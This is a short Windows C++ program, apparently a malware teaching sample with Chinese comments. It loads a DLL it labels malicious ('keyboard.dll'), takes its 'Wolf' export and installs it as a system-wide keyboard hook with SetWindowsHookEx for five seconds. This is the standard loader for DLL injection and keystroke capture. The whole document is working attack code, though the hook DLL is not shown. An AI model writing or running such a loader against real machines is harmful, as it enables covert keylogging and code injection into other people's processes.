#include <windows.h>
#include <cstdio>

typedef int (__cdecl *WolfProc)();

int main(void) {
  HINSTANCE wolfDll;
  WolfProc wolfFunc;
  //加载恶意DLL文件
  wolfDll = LoadLibrary(TEXT("keyboard.dll"));

  //获取恶意DLL文件
  wolfFunc = (WolfProc) GetProcAddress(wolfDll, "Wolf");

  //使用WH_KEYBOARD安装挂钩
  HHOOK hook = SetWindowsHookEx(WH_KEYBOARD, (HOOKPROC)wolfFunc, wolfDll, 0);
  Sleep(5*1000);
  UnhookWindowsHookEx(hook);

  return 0;
}
